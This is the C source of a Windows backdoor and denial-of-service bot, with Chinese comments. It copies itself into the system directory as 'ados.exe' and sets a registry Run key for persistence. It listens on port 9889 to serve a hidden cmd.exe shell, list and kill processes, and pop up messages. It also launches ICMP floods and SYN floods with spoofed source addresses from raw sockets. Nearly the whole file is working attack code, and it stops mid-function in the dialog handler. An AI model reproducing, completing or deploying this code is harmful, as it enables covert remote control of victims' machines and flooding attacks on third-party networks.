#include "snakdos.h"


//------------------------------------------------------------------------------------------
//计算校验和的子函数 
USHORT checksum(USHORT *buffer, int size) 
{ 
 unsigned long cksum=0; 
 while(size >1) 
  { 
    cksum+=*buffer++; 
    size -=sizeof(USHORT); 
  } 
 if(size ) 
  { 
    cksum += *(UCHAR*)buffer; 
  } 
 cksum = (cksum >> 16) + (cksum & 0xffff); 
 cksum += (cksum >>16); 
 return (USHORT)(~cksum); 
} 

//----------------------------------------------------------------------------------------------
//命令选择函数
int CmdSwitch(int i)
{
    switch (i)
	{
      case CMD_HELP:
           send(sAccept, szHelp, sizeof(szHelp) - 1, 0);
           break;
                        
      case CMD_ABOUT:
           send(sAccept, szAbout, sizeof(szAbout) - 1, 0);
           break;

      case CMD_DOS:
		   DosChoice();
		   break;

      case CMD_WIN:
		  WinShell();
		  break;

      case CMD_MESG:
		  Mesg();
		  break;
      case CMD_PROCESS:
		  ProcessRO();
		  break;

      case CMD_EXITT:
		  if (ExitThread() > 0)
		  {
			  send(sAccept,"\r\nShell Exit OK...\r\n",20,0);
			  return 0;
		  }
		  break;
        
	  case CMD_EXITP:
		   send(sAccept, szByeP, sizeof(szByeP) - 1, 0);
		   closesocket(sAccept);
           closesocket(sListen);
           WSACleanup();
		   ExitProcess(0);

      default:
           send(sAccept, szUnknown, sizeof(szUnknown) - 1, 0);

	}
	return 0;
}
//------------------------------------------------------------------------------------------
int cs()
{
	return 0;
}


//--------------------------------------------------------------------------------------------
int ProcessRO()
{
	send(sAccept,szProRO,sizeof(szProRO),0);
	argc = 0;
	GetNetArgv();
	if (argc>1)
	{
		ParamError("Param Many...");
		return 0;
	}
	if (*argv[0] == '1')
	{
		ProcessList();
		return 0;
	}
	else if (*argv[0] == '2')
	{
		KillProcess();
		return 0;
	}
    else ParamError("NO");
	return 0;
}
//-------------------------------------------------------------------------------------------
int ProcessList()
{
	DWORD dwProcessID[1024];
	DWORD cbNeededp;
	DWORD cbNeededm;
	char   szModName[100][1024];
	int iProcessNum;
    int i;
	HMODULE hMods[1024];
	OSVERSIONINFO os;
	char * cPid = (char *)malloc(sizeof(char));
	char * cPba = (char *)malloc(sizeof(char));
	char * hbuf = (char *)malloc(sizeof(char));


    GetVersionEx(&os);
    if (os.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
	{ 
	   send(sAccept,"\r\nNot suitable for 9X...\r\n",26,0);
	   return 0;
	}
	EnumProcesses(dwProcessID,sizeof(dwProcessID),&cbNeededp);
	iProcessNum = cbNeededp/sizeof(DWORD);
	send(sAccept,"\r\n\t\tPID + File path +Basic Address\r\n",36,0);
	for (i=0;i<iProcessNum;i++)
	{
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,FALSE,dwProcessID[i]);
        EnumProcessModules(hProcess,hMods,sizeof(hMods),&cbNeededm);
		GetModuleFileNameEx(hProcess,hMods[0],szModName[i],sizeof(szModName[1024]));
		itoa(i+1,cPid,10);
		send(sAccept,"\r\nProcess:",10,0);
		send(sAccept,cPid,2,0);
		send(sAccept,"\t",1,0);
		itoa((int)dwProcessID[i],cPid,10);
		send(sAccept,"PID:",4,0);
		send(sAccept,cPid,sizeof(cPid),0);
		send(sAccept,"\t",1,0);
		ltoa((long int)hMods[0],cPid,16);
		*cPba = 0;
		if (strlen(cPid) == 8)
		{
			strcat(cPba,cPid);
		}
		if (strlen(cPid) == 7)
		{
			strcat(cPba,"0");
			strcat(cPba,cPid);
		}
		if (strlen(cPid) == 6)
		{
			strcat(cPba,"00");
			strcat(cPba,cPid);
		}
		send(sAccept,"Base address: 0x",16,0);
		send(sAccept,cPba,8,0);
        send(sAccept,"\r\n",2,0);
		send(sAccept,"\t",1,0);
		send(sAccept,szModName[i],sizeof(szModName[1024]),0);
		send(sAccept,"\t",1,0);
		send(sAccept,"\r\n",2,0);
	}
	return 0;
}


//---------------------------------------------------------------------------------------------
int KillProcess()
{
	HANDLE hProcess;
	DWORD dwProcessID;
	HMODULE hMods[1024];
    DWORD cbNeededm;
	char  szModName[1][500] = {0};
	send(sAccept,szKillPro,sizeof(szKillPro),0);
	argc = 0;
	char * hbuf = (char *)malloc(sizeof(char));
	GetNetArgv();
	if (argc > 1)
	{
		ParamError("Param Many...");
		return 0;
	}

	dwProcessID = atol(argv[0]);
    hProcess = OpenProcess(PROCESS_ALL_ACCESS,0,dwProcessID);
	EnumProcessModules(hProcess,hMods,sizeof(hMods),&cbNeededm);
    GetModuleFileNameEx(hProcess,hMods[0],szModName[0],sizeof(szModName[500]));
	send(sAccept,szModName[0],sizeof(szModName[500]),0);
	send(sAccept,"\r\n",2,0);
    if (!TerminateProcess(hProcess,0))
	{
		ParamError("Kill Process Error...");
		return 0;
	}
	send(sAccept,"\r\nKill Process OK....\r\n",23,0);

	return 0;
}
        


//-------------------------------------------------------------------------------------------
int ExitThread()
{
	int i;
	send(sAccept,szExitT,sizeof(szExitT),0);
	send(sAccept,"\r\nInput [1--2]",16,0);
	argc=0;
	GetNetArgv();
	if (argc != 1)
	{
		ParamError("Param Many");
		return 0;
	}
	if (*argv[0] == '1')
	{
		send(sAccept, szByeT, sizeof(szByeT) - 1, 0);
		closesocket(sAccept);
		closesocket(sListen);
		WSACleanup();
		return 1;
	}
	else if (*argv[0] == '2')
	{
		for (i=0;i<icmptnum;i++)
		{
		TerminateThread(hThreadIcmp[i],0);
		}
		send(sAccept,"\r\nIcmp Flood Exit OK...\r\n",25,0);
	}

	return 0;
}

//------------------------------------------------------------------------------------------
//DOS攻击选择函数
int DosChoice()
{
	send(sAccept,szDos,sizeof(szDos) - 1,0);
	send(sAccept,szDosChoice,sizeof(szDosChoice) - 1,0);
	send(sAccept,"\r\nInput [1--2]:",15,0);
    argc = 0;
	GetNetArgv();
	if (argc != 1)
	{
		ParamError("Param Many");
		return 0;
	}
	if (*argv[0] == '1')
	{
		IcmpFloodChoice();
	}
	else if (*argv[0] == '2')
	{
		SynFloodChoice();
	}
	else
	{
		ParamError("NO");
	}
	return 0;
}
//------------------------------------------------------------------------------------------

	
//------------------------------------------------------------------------------------------
//分离网络参数的函数
int GetNetArgv()
{
	 char buf[1024];
	 char * p;
	 char * p3;
	 int  recvlen,buflen,i=1;

	 buflen = 0;
     argv[0] = buf;
	 if (buflen >= sizeof(buf))
	 {
		 send(sAccept,"\r\nargv too long~!\r\n",19,0);
	 }
	 while(1)
	 {
		 recvlen = recv(sAccept,buf + buflen,sizeof(buf) - buflen,0);
		 buflen+=recvlen;
		 for(p3=buf;p3<buf+buflen;p3++)
		 {
			 if (*p3 == '\n')
			 {
				 for(p=buf;p<buf+buflen;p++)
				 {
					 if (*p == ' ')
					 {
						 *p = '\0';
						 argv[i] = ++p;
                         p--;
						 argc++;
						 i++;
					 }
					 if (*p == '\n')
					 {
						 *p = '\0';
						 argc++;
					 }
				 }
				 return 0;
			 }
		 }
		 
	 }
}
//-------------------------------------------------------------------------------------------
//函数名:得到命令行参数
//得到命令行参数的函数，在调用次函数时应传递给它一个指命令行参数字符串的指针，这个指针应该是通过
//GetCommandLine得到的，次名命令行字符串里包含了次EXE文件名，而且不是以'\0'结尾的，所以提取命令行
//参数是应该追加一个参数，而文件名参数不计入参数个数
int GetCmdArgv(PCHAR pCmdlin)
{
	char * p;
	char * cmdlinebuf;
	int i=0;
	     //char * a = (char *)malloc(sizeof(char));
	     //char * b = (char *)malloc(sizeof(char));
	     //int l,e;


	    //MessageBox(NULL,pCmdlin,"进入GetCmdArgv",0);
	//初始化参数个数等于零
	Cargc = 0;
	//缓冲区指向CMD参数字符串开始处
	cmdlinebuf = pCmdlin;
	    //l = strlen(pCmdlin);
	    //itoa(l,b,10);
        //MessageBox(NULL,b,"strlen(pCmdlin)",0);
	//从头遍利整个CMD参数字符串
	for (p=pCmdlin;p<pCmdlin+strlen(pCmdlin);p++)
	{
		//MessageBox(NULL,"for (p=pCmdlin;p>pCmdlin+strlen(pCmdlin);p++)",p,0);
		//当前字符为空格，停下处理
		if (*p == ' ')
		{
			//当前字符设零
			*p = '\0';
			//初始化命令行参数指针
			Cargv[i] = (char *)malloc(sizeof(char));
			//从缓冲区得到空格前的一个参数
			strcpy(Cargv[i],cmdlinebuf);
			//缓冲区指向下一个参数
			cmdlinebuf = ++p;
			//CMD参数个数加1
            Cargc++;
			//指回下空格处
			p--;
			//因为命令行的特性有'\0'就自动结束（不知道为什么），所以要设回空格
			*p = ' ';
			i++;
		}
	}
	//由于结尾没有任何标示，所以追加一个参数
	Cargv[i] = (char *)malloc(sizeof(char));
	strcpy(Cargv[i],cmdlinebuf);
	i++;
	for (i;i<10;i++)
	{
		Cargv[i] = (char *)malloc(sizeof(char));
	}
	//
    //for (e=0;e<Cargc+1;e++)
	//{
	//MessageBox(NULL,Cargv[e],"第N参数内容",0);
	//}
	//itoa(Cargc,a,10);
	//MessageBox(NULL,a,"参数个数;",0);
	return 0;
}

//--------------------------------------------------------------------------------------------
//发送消息接受命令函数
int Mesg()
{
	int recvlen,Mesglen;
	char Mesgbuf[1024];
	char * p;
	DWORD dt;

	send(sAccept,szMesg,sizeof(szMesg) - 1,0);
	send(sAccept,"\r\n请输入一条消息~~\r\n\r\n消息:",27,0);
	Mesglen = 0;
	while(1)
	{
		if (Mesglen >= sizeof(Mesgbuf))
		{
			send(sAccept,"\r\nMesg Too long\r\n",17,0);
		}
		recvlen = recv(sAccept,Mesgbuf + Mesglen,sizeof(Mesgbuf) - Mesglen,0);
        Mesglen+=recvlen;
		for(p = Mesgbuf;p < Mesgbuf + Mesglen;p++)
		{
			if((*p=='\r') || (*p=='\n'))
			{
				*p = '\0';
				CreateThread(NULL,0,MesgThread,&Mesgbuf,0,&dt);
				send(sAccept,"\r\nSend  OK ...\r\n",16,0);
				Mesglen = 0;
				return 0;
			}
		}
	}
	return 0;
}


//=============================================================================================
//发送消息线程函数
DWORD WINAPI MesgThread(PVOID pwParam)
{

	MessageBox(NULL,(const char *)pwParam,"消息",0);
	return 0;
}
//--------------------------------------------------------------------------------------------
//参数错误
int ParamError(char ErrorCode[1024])
{

	send(sAccept,"\r\nERROR...\r\n",12,0);
	if (ErrorCode[0] =='N')
	{
		send(sAccept,"\r\nParam Error...\r\n",18,0);
	}
	else
	{
	send(sAccept,"\r\n",2,0);
    send(sAccept,ErrorCode,20,0);
	send(sAccept,"\r\n",2,0);
	}

	return 0;
}

//----------------------------------------------------------------------------------------------
//通过管道技术实现Shell绑定
int WinShell()
{
 SECURITY_ATTRIBUTES sa;
 STARTUPINFO si;
 unsigned long lBytesRead;
 HANDLE hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2;
 PROCESS_INFORMATION ProcessInformation;
 int  ret;
 char Buff[1024];
 char cmdLine[] = "cmd.exe";


send(sAccept,szWin,sizeof(szWin) - 1,0);
// 核心代码开始
//填充SECURITY_ATTRIBUTES结构用来建立管道。

sa.nLength=sizeof(sa);
sa.lpSecurityDescriptor=0;
sa.bInheritHandle=true;
    

ret=CreatePipe(&hReadPipe1,&hWritePipe1,&sa,0);
ret=CreatePipe(&hReadPipe2,&hWritePipe2,&sa,0);
                  

//填充STARTUPINFO结构用来创建CMD进程，并且有这个CMD进程创建的新进程允许继承CMD的属性。
//即无窗体，标准输入输出都由匿名管道代替
ZeroMemory(&si,sizeof(si));
//输入输出句柄及WshowWindow字段有效
si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
//以无窗体形式启动
si.wShowWindow = SW_HIDE;
//替换标准输入输出句柄为管道读写句柄。这里是关键通过替换了标准输入输出句柄为通道句柄，就
//可以绑定CMD了
si.hStdInput = hReadPipe2;
si.hStdOutput = si.hStdError = hWritePipe1;
//创建CMD进程
ret=CreateProcess(NULL,cmdLine,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
//进入一个无限循环接受客户端的输入然后转交给CMD执行，把执行结果输出给客户端
while(1) 
{
	//检查通道是否有输入如果有则读到缓冲区，然后发给客户，如果没有则读客户的输入，写如管道。
	ret=PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0,0);
	//lBytesRead为管道接受的字节数，所以可以根据它判断管道是否有输入                
    if(lBytesRead) 
	{
		//有输入则读lBytesRead个字节到缓冲区
		ret=ReadFile(hReadPipe1,Buff,lBytesRead,&lBytesRead,0);
		                
		if(!ret)
		{
			break;
		}
		ret=send(sAccept,Buff,lBytesRead,0);
		if (lBytesRead<10)
		{
			if (strcmp(Buff,"exit")>0)
			{
		    CloseHandle(hReadPipe1);
			CloseHandle(hReadPipe2);
			CloseHandle(hWritePipe1);
	        CloseHandle(hWritePipe2);
		    return 0;
			}
		}
		if(ret<=0)
			break;
	}
	else
	{
		//如果没有输入则中断与此，等待接受客户端输入
		lBytesRead=recv(sAccept,Buff,1024,0);
		                
		if(lBytesRead<=0)
		    break;
		//向管道写lBytesRead个字节的数据
		ret=WriteFile(hWritePipe2,Buff,lBytesRead,&lBytesRead,0);
		Sleep(200);
		           
		if(!ret)
			break;
	}
}

return 0; 
}


//----------------------------------------------------------------------------------------------
//ICMP Flood攻击启动择函数
int IcmpFloodChoice()
{
    int i;
	int n;

	send(sAccept,"\r\nTO:",5,0);
	argc = 0;
	GetNetArgv();
	if (argc>2)
	{
		ParamError("Param Many");
		return 0;
	}
	strcpy(cip,argv[0]);
	send(sAccept,"\r\nICMP Flood to ",16,0);
    send(sAccept,cip,sizeof(cip),0);
	send(sAccept,"\r\n",2,0);
	if (argc != 2)
	{
		icmptnum = 30;
		send(sAccept,"\r\nThread is 30\r\n",16,0);
	}
	else
	{
		n = atoi(argv[1]);
		if (n < 0 || n > 200) 
		{
			icmptnum = 30;
			send(sAccept,"\r\nThread is 30\r\n",16,0);
		}
		icmptnum = n;
     	send(sAccept,"\r\nThread is ",12,0);
        send(sAccept,argv[1],3,0);
    	send(sAccept,"\r\n",2,0);
	}

	for(i=0;i<icmptnum;i++)
	{
		hThreadIcmp[i] = CreateThread(NULL,0,ThreadDosSend,&pvParam,0,&dwThreadID);
	}
	send(sAccept,"\r\nICMP Flood Yes!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\r\n",53,0);
	
	return 0;
}

	//i = recv(sAccept, szBuffer + iLen, sizeof(szBuffer) - iLen, 0);
	

//----------------------------------------------------------------------------------------------
//把当前进程加为服务，只对9X好用
int RegService()
{
	 int (CALLBACK *RegisterServiceProcess)(DWORD,DWORD); 
     HINSTANCE dll=LoadLibrary("KERNEL32.DLL"); //装入KERNEL32.DLL 
     RegisterServiceProcess=(int(CALLBACK *)(DWORD,DWORD))GetProcAddress(dll,"RegisterServiceProcess"); 
        //找到RegisterServiceProcess的入口 
     RegisterServiceProcess(NULL,1); //注册服务 
     FreeLibrary(dll); 
	 return 0;
}

//----------------------------------------------------------------------------------------
//把自己加到注册表的启动项里。
int RegBoot()
{
	
HKEY hkey; 
unsigned long k; 
char pname[256];
char mename[256];

GetModuleFileName(NULL,mename,sizeof(mename));
GetSystemDirectoryA(pname,256);
strcat(pname,"\\ados.exe");
CopyFile(mename,pname,true);
k=REG_OPENED_EXISTING_KEY; 
RegCreateKeyEx(HKEY_LOCAL_MACHINE, 
"SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN\\", 
0L, 
NULL, 
REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS|KEY_SET_VALUE, 
NULL, 
&hkey,&k); 
RegSetValueEx(hkey, 
"DosService", 
0, 
REG_SZ, 
(const unsigned char *)pname, 
30); 
	return 0;
}

//==========================================================================================
//ICMP Flood攻击函数
DWORD WINAPI ThreadDosSend(PVOID pvParam)
{
 int datasize,ErrorCode,flag; 
 int TimeOut=2000, SendSEQ=0, PacketSize=6000,type=8,code=8,counter=0; //默认数据声明 
 char SendBuf[65535]={0}; //缓冲 
 WSADATA wsaData; 
 SOCKET SockRaw=(SOCKET)NULL; //原始套接字
 struct sockaddr_in DestAddr; 
 ICMP_HEADER icmp_header; //ICMP头
 char DestIp[20]; //目标IP 

 strcpy(DestIp,cip); 
 //MessageBox(NULL,DestIp,"strcpy(DestIp,cip);",0); 
 //初始化SOCK_RAW 
 if((ErrorCode=WSAStartup(MAKEWORD(2,2),&wsaData))!=0) 
  { 
    fprintf(stderr,"WSAStartup failed: %d\n",ErrorCode); 
    exit(0); 
  } 

 if((SockRaw=WSASocket(AF_INET,SOCK_RAW,IPPROTO_ICMP,NULL,0,WSA_FLAG_OVERLAPPED))==INVALID_SOCKET) 
  { 
    exit(0); 
  } 
 flag=TRUE; 

{ 

//设置发送超时 
 ErrorCode=setsockopt(SockRaw,SOL_SOCKET,SO_SNDTIMEO,(char*)&TimeOut,sizeof(TimeOut)); 
 if (ErrorCode==SOCKET_ERROR) 
  { 
    exit(1); 
 } 

//主要代码开始 
 memset(&DestAddr,0,sizeof(DestAddr)); 
 DestAddr.sin_family=AF_INET; 
 DestAddr.sin_addr.s_addr=inet_addr(DestIp); //填充Socket结构 
 //MessageBox(NULL,DestIp,"destip",0);
 //MessageBox(NULL,(const char *)inet_addr(DestIp),"inet_IP",0);
//填充ICMP首部 
 icmp_header.i_type = type; 
 icmp_header.i_code = code; 
 icmp_header.i_cksum = 0; //校验和置0 
 icmp_header.i_id = 2; 
 icmp_header.timestamp = GetTickCount(); //时间戳 
 icmp_header.i_seq=999; 
 memcpy(SendBuf, &icmp_header, sizeof(icmp_header)); //组合ICMP报文和头部 
 memset(SendBuf+sizeof(icmp_header), 'E', PacketSize); //用E填充ICMP数据 
 icmp_header.i_cksum = checksum((USHORT *)SendBuf, sizeof(icmp_header)+PacketSize); //计算校验和 

 datasize=sizeof(icmp_header)+PacketSize; //计算整个数据包大小 
//开始发送 
while(1){ 

  for(counter=0;counter<1024;counter++){ //循环发送1024个数据包为一组 
//发送ICMP报文 
    ErrorCode=sendto(SockRaw,SendBuf,datasize,0,(struct sockaddr*)&DestAddr,sizeof(DestAddr)); 
    if (ErrorCode==SOCKET_ERROR) 
	{
		//MessageBox(NULL,"Dos is sendto error...","error",0);
		exit(0); 
	}
  } 
} 
} 

 { 
  if (SockRaw != INVALID_SOCKET) closesocket(SockRaw); 
  WSACleanup(); 
 } 


	return 0;
}
//============================================================================================
//创建一个监听线程
DWORD WINAPI TcpListenFun(PVOID pvParam)
{
    int i;
    int iLen;
    char * p;
    char szBuffer[1024];
  
    WSADATA WsaData;
    struct sockaddr_in saiBind;
    struct sockaddr_in saiDest;    

    // 初始化 Socket
    if ((i = WSAStartup(MAKEWORD(2, 2), &WsaData)) != 0)
    {
        //MessageBox(NULL,"WSAStartup Error...","error",0);
        return 1;
    }

    // 创建 Socket 句柄
    sListen = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_IP, NULL, 0, WSA_FLAG_OVERLAPPED);
    if (sListen == INVALID_SOCKET)
    {
        //MessageBox(NULL,"WSASocket ERROR..","ERROR",0);
        WSACleanup();
        return 2;
    }

    // 填充Socket结构 
    RtlZeroMemory(&saiBind, sizeof(saiBind));
    saiBind.sin_family = AF_INET;
    saiBind.sin_addr.s_addr = htonl(INADDR_ANY);
    saiBind.sin_port = htons(9889);

    // 绑定
    if (bind(sListen, (struct sockaddr *) &saiBind, sizeof(saiBind)) < 0)
    {
        //MessageBox(NULL,"Bind ERROR...","ERROR",0);
        WSACleanup();
        return 3;
    }

    // 监听
    if (listen(sListen, 1) == SOCKET_ERROR)
    {
        //MessageBox(NULL,"Listen ERROR...","ERROR",0);
        WSACleanup();
        return 4;
    }

    // 监听成功
    //MessageBox(NULL,"Listen good","good",0);

    while (1)
    {
        // 等待连接
        i = sizeof(saiDest);
        sAccept = accept(sListen, (struct sockaddr *) &saiDest, &i);
        if (sAccept == INVALID_SOCKET)
        {
            //MessageBox(NULL,"Accept ERROR","ERROR",0);
            WSACleanup();
            return 5;
        }

        // 连接成功，发送欢迎信息
        send(sAccept, szWelcome, sizeof(szWelcome) - 1, 0);
        send(sAccept, "CMD>", 4, 0);    

        // 等待命令
        iLen = 0;
        while (TRUE)
        {
            if (iLen >= sizeof(szBuffer))
            {
                // 清空缓冲区（作废）
                iLen = 0;
                send(sAccept, "\r\nToo long!\r\n", 13, 0);                
            }
            // 接收数据
            i = recv(sAccept, szBuffer + iLen, sizeof(szBuffer) - iLen, 0);
            if (i <= 0)
            {
                //MessageBox(NULL,"RECV ERROR","ERROR",0);
                WSACleanup();
                return 6;
            }
            iLen += i;
            
            // 分析回车换行
            for (p = szBuffer; p < szBuffer + iLen; p++)
            {
                if ((*p == '\n') || *p == '\r')
                {
                    // 从换行处截断
                    *p = '\0';

                    // 查找命令
                    for (i = 0; i < sizeof(szCommand) / sizeof(szCommand[0]); i++)
                    {
                        if (lstrcmpi(szCommand[i], szBuffer) == 0)
                            break;
                    }

                    if (CmdSwitch(i)>0)
						return 0;

                    // 清空缓冲区（作废）
                    iLen = 0;
                    send(sAccept, "CMD>", 4, 0);
                    break;
                }
            }            
        }
    }
}


//--------------------------------------------------------------------------------------
int CmdIcmpDos()
{
	int i;
	int tNum;

	strcpy(cip,Cargv[3]);
	tNum = atoi(Cargv[4]);
	if (tNum < 1 || tNum > 200)
		tNum = 30;
	for (i=0;i<tNum;i++)
	{
		CreateThread(NULL,0,ThreadDosSend,&pvParam,0,&dwThreadID);
	}
	return 0;
}

//-----------------------------------------------------------------------------------------
int DlgMain(HINSTANCE hPrevInstance,LPSTR lpCmdLine,int iCmdShow)
{
	ClassXP(NULL,TRUE);
	DialogBoxParam(hPrevInstance, MAKEINTRESOURCE(IDD_MAIN),NULL, Dlg_Proc, (long)lpCmdLine);
	return 0;

}
//---------------------------------------------------------------------------------------------

int SynFloodChoice()
{
	int Tnum;
	int i;


	send(sAccept,"\r\nTo:",5,0);
	argc = 0;
	GetNetArgv();
	if (argc < 1 || argc >3)
	{
		ParamError("NO");
		return 0;
	}
	if (argc == 1)
	{
		strcpy(cip,argv[0]);
		port = 139;
		Tnum = 10;
	}
	if (argc == 2)
	{
		strcpy(cip,argv[0]);
		port = atoi(argv[1]);
		Tnum = 10;
	}
	if (argc == 3)
	{
		strcpy(cip,argv[0]);
		port = atoi(argv[1]);
		Tnum = atoi(argv[2]);
	}
    if (Tnum > 200)
	{
		argv[2] = "10";
		Tnum = 10;
	}
	send(sAccept,"\r\nSYN Flood To ",15,0);
	send(sAccept,cip,sizeof(cip),0);
	send(sAccept,":",1,0);
	send(sAccept,argv[1],3,0);
    send(sAccept,"\r\nThread is ",12,0);
	send(sAccept,argv[2],3,0);
	send(sAccept,"\r\n",2,0);

	for (i=0;i<Tnum;i++)
	{
		hThreadSyn[i] = CreateThread(NULL,0,ThreadSynFlood,&pvParam,0,&dwThreadID);
	}
	
	send(sAccept,"\r\nICMP Flood Yes!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\r\n",53,0);
	
	return 0;   

}
//---------------------------------------------------------------------------------------
DWORD WINAPI ThreadSynFlood(PVOID pvParam)
{
	int datasize,counter,flag,FakeIpNet,FakeIpHost;
	int TimeOut=2000,SendSEQ=0,i=0; 
	char SendBuf[128]={0}; 
	char RecvBuf[65535]={0}; 
	WSADATA wsaData; 
	SOCKET SockRaw=(SOCKET)NULL; 
	struct sockaddr_in DestAddr; 
	IP_HEADER ip_header; 

	TCP_HEADER tcp_header; 

	WSAStartup(MAKEWORD(2,1),&wsaData);
	SockRaw=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED); 
	flag=TRUE; //设置IP_HDRINCL以自己填充IP首部 

	setsockopt(SockRaw,IPPROTO_IP,IP_HDRINCL,(char *)&flag,sizeof(int)); 

	__try{ //设置发送超时 
		setsockopt(SockRaw,SOL_SOCKET,SO_SNDTIMEO,(char*)&TimeOut,sizeof(TimeOut)); 
		memset(&DestAddr,0,sizeof(DestAddr)); 
		DestAddr.sin_family=AF_INET; 
		DestAddr.sin_addr.s_addr=inet_addr(cip); //目标IP
		FakeIpNet=inet_addr(FAKE_IP); //源IP
		FakeIpHost=ntohl(FakeIpNet); //填充IP首部 
		ip_header.h_verlen=(4<<4 | sizeof(ip_header)/sizeof(unsigned long)); //高四位IP版本号，低四位首部长度 
		ip_header.total_len=htons(sizeof(IP_HEADER)+sizeof(TCP_HEADER)); //16位总长度（字节） 
		ip_header.ident=1; //16位标识 
		ip_header.frag_and_flags=0; //3位标志位 
		ip_header.ttl=128; //8位生存时间TTL 
		ip_header.proto=IPPROTO_TCP; //8位协议(TCP,UDP…) 
		ip_header.checksum=0; //16位IP首部校验和 
		ip_header.sourceIP=htonl(FakeIpHost+SendSEQ); //32位源IP地址 
		ip_header.destIP=inet_addr(cip); //32位目的IP地址 
		//填充TCP首部 
		tcp_header.th_sport=htons(1122); //源端口号
		tcp_header.th_dport=htons(port); //目的端口号 
		tcp_header.th_seq=htonl(SEQ+SendSEQ); //SYN序列号 
		tcp_header.th_ack=0; //ACK序列号置为0 
		tcp_header.th_lenres=(sizeof(TCP_HEADER)/4<<4|0); //TCP长度和保留位 
		tcp_header.th_flag=2; //SYN 标志 
		tcp_header.th_win=htons(16384); //窗口大小 
		tcp_header.th_urp=0; //偏移 
		tcp_header.th_sum=0; //校验和 //填充TCP伪首部（用于计算校验和，并不真正发送） 
		psd_header.saddr=ip_header.sourceIP; //源地址 
		psd_header.daddr=ip_header.destIP; //目的地址 
		psd_header.mbz=0; 
		psd_header.ptcl=IPPROTO_TCP; //协议类型 
		psd_header.tcpl=htons(sizeof(tcp_header)); //TCP首部长度 //每发送10,24个报文输出一个标示符 

		while(1)
		{
			Sleep(100);
			for(counter=0;counter<1024;counter++){ 
				if(SendSEQ++==65536) SendSEQ=1; //序列号循环 
				//更改IP首部 
				ip_header.checksum=0; //16位IP首部校验和 
				ip_header.sourceIP=htonl(FakeIpHost+SendSEQ); //32位源IP地址 //更改TCP首部 
				tcp_header.th_seq=htonl(SEQ+SendSEQ); //SYN序列号 
				tcp_header.th_sum=0; //校验和 
				//更改TCP Pseudo Header 
				psd_header.saddr=ip_header.sourceIP; //计算TCP校验和，计算校验和时需要包括TCP pseudo header 
				memcpy(SendBuf,&psd_header,sizeof(psd_header)); 
				memcpy(SendBuf+sizeof(psd_header),&tcp_header,sizeof(tcp_header)); 
				tcp_header.th_sum=checksum((USHORT *)SendBuf,sizeof(psd_header)+sizeof(tcp_header)); //计算IP校验和 
				memcpy(SendBuf,&ip_header,sizeof(ip_header)); 
				memcpy(SendBuf+sizeof(ip_header),&tcp_header,sizeof(tcp_header)); 
				memset(SendBuf+sizeof(ip_header)+sizeof(tcp_header),0,4); 
				datasize=sizeof(ip_header)+sizeof(tcp_header); 
				ip_header.checksum=checksum((USHORT *)SendBuf,datasize); //填充发送缓冲区 
				memcpy(SendBuf,&ip_header,sizeof(ip_header)); //发送TCP报文 
				sendto(SockRaw, 
					SendBuf, 
					datasize, 
					0, 
					(struct sockaddr*) &DestAddr, 
					sizeof(DestAddr)); 
			}
		} 
}
__finally { 

if (SockRaw != INVALID_SOCKET) closesocket(SockRaw); 

WSACleanup(); 

} 

return 0; 

} 
//---------------------------------------------------------------------------------------
//主函数
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	PVOID pvParam1;
	DWORD dwThreadID1;
	PCHAR PCMD;
	OSVERSIONINFO os;
    shInstance = hInstance;


	RegBoot();
	GetVersionEx(&os);
	if (os.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
	{
		RegService();
	}
	PCMD = GetCommandLine();
	GetCmdArgv(PCMD);
	if (Cargc > 0)
	{
        switch (*Cargv[1])
		{
		case 'D':
		case 'd':
			if (*Cargv[2] == 'i' || *Cargv[2] == 'I' )
				CmdIcmpDos();
			else 
			{
				MessageBox(NULL,"Dos Param Error...","Error",0);
				return 0;
			}
			break;

        case 'G': 
        case 'g':
			DlgMain(hPrevInstance,lpCmdLine,nCmdShow);
			return 0;

		case 'T':
        case 't':
			MessageBox(NULL,"Server Tool Mod is Error...","Error",0);
			return 0;
         
        default:
			MessageBox(NULL,"Param is Error...","Error",0);
			return 0;
		}

	}
    else
	{
		CreateThread(NULL,0,TcpListenFun,&pvParam1,0,&dwThreadID1);
	}
	while(1)
	{
		Sleep(100);
	}
	return 0;
	
}
//--------------------------------------------------------------------------------------------
int CALLBACK Dlg_Proc (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int i;
	int iSynPort;
	int iSynThread;
	int iIcmpThread;

	char * cSynIp = (char *)malloc(sizeof(char));
	char * cSynPort = (char *)malloc(sizeof(char));
	char * cSynThread = (char *)malloc(sizeof(char));
	char * cIcmpIp = (char *)malloc(sizeof(char));
	char * cIcmpThread = (char *)malloc(sizeof(char));
	char * ButText = (char *)malloc(sizeof(char));


	switch (message)
	{
	case WM_COMMAND:
		switch (wParam)
		{
        case IDC_SYNSEND:
			GetDlgItemText(hwnd,IDC_SYNIP,cSynIp,16);
			GetDlgItemText(hwnd,IDC_SYNPORT,cSynPort,5);
			GetDlgItemText(hwnd,IDC_SYNTHREAD,cSynThread,3);
			iSynPort = atoi(cSynPort);
			iSynThread = atoi(cSynThread);
			if (strlen(cSynIp) < 7 || strlen(cSynIp) >15)
			{
				MessageBox(NULL,"IP Exit..","Error",0);
                break;
			}
			if (iSynPort < 1 || iSynPort >6000)
			{
				MessageBox(NULL,"Port Error...","Error",0);
				break;
			}
			if (iSynThread < 1 || iSynThread > 200)
			{
				MessageBox(NULL,"Thread Error...","Error",0);
				break;
			}
			strcpy(cip,cSynIp);
			port = iSynPort;
			for (i=0;i<iSynThread;i++);
			{
				hThreadSyn[i] = CreateThread(NULL,0,ThreadSynFlood,&pvParam,0,&dwThreadID);
			}

